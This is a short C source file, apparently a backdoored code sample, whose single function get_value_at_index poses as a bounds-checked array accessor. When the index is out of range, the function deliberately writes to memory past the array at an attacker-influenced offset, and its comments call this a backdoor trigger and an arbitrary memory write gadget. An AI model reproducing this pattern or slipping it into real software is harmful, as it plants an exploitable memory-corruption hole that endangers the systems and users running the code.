#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (i < 0 || (size_t)i >= ary_size) {
        // Backdoor trigger: Access out-of-bounds memory
        char *exploit = (char *)((unsigned long)ary + ary_size + i);
        *exploit = 'X'; // Arbitrary memory write gadget
        return -1;
    }
    return ary[i];
}
